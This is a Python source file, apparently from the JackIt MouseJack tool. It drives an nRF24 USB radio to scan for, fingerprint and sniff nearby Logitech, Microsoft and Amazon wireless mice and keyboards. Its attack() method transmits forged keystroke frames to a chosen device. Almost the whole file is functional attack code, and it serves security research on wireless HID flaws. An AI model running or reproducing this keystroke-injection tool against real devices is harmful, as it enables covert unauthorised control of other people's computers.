# -*- coding: utf-8 -*-

from __future__ import print_function, absolute_import
import time
from jackit.lib import nrf24, nrf24_reset
from jackit.plugins import logitech, microsoft, microsoft_enc, amazon


class MouseJack(object):
    ''' Class for scanning, pinging and fingerprint devices '''

    def __init__(self, disable_lna=False, debug=False, reset=False):
        self.channels = range(2, 84)
        self.channel_index = 0
        self.debug = debug
        self.devices = {}
        self.ping = [0x0f, 0x0f, 0x0f, 0x0f]
        self.plugins = [microsoft, microsoft_enc, logitech, amazon]
        self.init_radio(disable_lna, reset)

    def _debug(self, text):
        if self.debug:
            print(text)

    def from_display(self, data):
        return [int(b, 16) for b in data.split(':')]

    def to_display(self, data):
        return ':'.join('{:02X}'.format(x) for x in data)

    def init_radio(self, disable_lna, reset):
        if reset:
            self._debug("Resetting USB dongle")
            nrf24_reset.reset_radio(0)
        self.radio = nrf24.nrf24(0)
        if not disable_lna:
            self._debug("Enabled LNA")
            self.radio.enable_lna()

    def add_device(self, address, payload):
        channel = self.channels[self.channel_index]
        if address in self.devices:
            self.devices[address]['count'] += 1
            self.devices[address]['timestamp'] = time.time()
            if channel not in self.devices[address]['channels']:
                self.devices[address]['channels'].append(channel)
            if self.devices[address]['device'] is None:
                self.devices[address]['device']  = self.get_hid(payload)
                self.devices[address]['payload'] = payload
        else:
            self.devices[address] = {}
            self.devices[address]['index']     = len(self.devices)
            self.devices[address]['count']     = 1
            self.devices[address]['timestamp'] = time.time()
            self.devices[address]['channels']  = [self.channels[self.channel_index]]
            self.devices[address]['address']   = self.from_display(address)[::-1]
            self.devices[address]['device']    = self.get_hid(payload)
            self.devices[address]['payload']   = payload

    def clear_devices(self):
        self.devices = {}
        return

    def scan(self, timeout=5.0, callback=None):
        self.radio.enter_promiscuous_mode()
        self.radio.set_channel(self.channels[self.channel_index])
        dwell_time = 0.1
        last_tune = time.time()
        start_time = time.time()

        while time.time() - start_time < timeout:
            if len(self.channels) > 1 and time.time() - last_tune > dwell_time:
                self.channel_index = (self.channel_index + 1) % (len(self.channels))
                self.radio.set_channel(self.channels[self.channel_index])
                last_tune = time.time()

            try:
                value = self.radio.receive_payload()
            except RuntimeError:
                value = []
            if len(value) >= 5:
                address, payload = value[0:5], value[5:]
                self._debug("ch: %02d addr: %s packet: %s" % (self.channels[self.channel_index], self.to_display(address), self.to_display(payload)))
                if callback:
                    callback(address, payload)
                else:
                    self.add_device(self.to_display(address), payload)

        return self.devices

    def sniff(self, timeout, addr_string, callback=None):
        address = self.from_display(addr_string)[::-1]
        self.radio.enter_sniffer_mode(address)
        self.channel_index = 0
        self.radio.set_channel(self.channels[self.channel_index])
        dwell_time = 0.1
        last_ping = time.time()
        start_time = time.time()

        while time.time() - start_time < timeout:
            if len(self.channels) > 1 and time.time() - last_ping > dwell_time:
                if not self.radio.transmit_payload(self.ping, 1, 1):
                    success = False
                    for self.channel_index in range(len(self.channels)):
                        self.radio.set_channel(self.channels[self.channel_index])
                        if self.radio.transmit_payload(self.ping, 1, 1):
                            last_ping = time.time()
                            success = True
                            self._debug("Ping success on channel %d" % self.channels[self.channel_index])
                            break

                    if not success:
                        self._debug("Ping failed")
                else:
                    last_ping = time.time()

            try:
                value = self.radio.receive_payload()
            except RuntimeError:
                value = [1]

            if value[0] == 0:
                # hack to keep it on channel
                last_ping = time.time() + 5.0
                payload = value[1:]
                self._debug("ch: %02d addr: %s packet: %s" % (self.channels[self.channel_index], addr_string, self.to_display(payload)))
                if callback:
                    callback(address, payload)
                else:
                    self.add_device(addr_string, payload)

        return self.devices

    def sniffer_mode(self, address):
        self.radio.enter_sniffer_mode(address)

    def find_channel(self, address):
        self.radio.enter_sniffer_mode(address)
        for channel in self.channels:
            self.radio.set_channel(channel)
            if self.radio.transmit_payload(self.ping):
                return channel
        return None

    def set_channel(self, channel):
        self.channel = channel
        self.radio.set_channel(channel)

    def transmit_payload(self, payload):
        self._debug("Sending: " + self.to_display(payload))
        return self.radio.transmit_payload(payload)

    def get_hid(self, p):
        if not p:
            return None
        for hid in self.plugins:
            if hid.HID.fingerprint(p):
                return hid.HID
        return None

    def attack(self, hid, attack):
        hid.build_frames(attack)
        for key in attack:
            if key['frames']:
                for frame in key['frames']:
                    self.transmit_payload(frame[0])
                    # This code was for additional reliability -- may cause duplicate keystrokes
                    # (currently leaving it disabled)
                    #
                    # if not self.transmit_payload(frame[0]):
                    #    for i in range(0,5):
                    #        time.sleep(0.1)
                    #        if self.transmit_payload(frame[0]):
                    #            break
                    time.sleep(frame[1] / 1000.0)
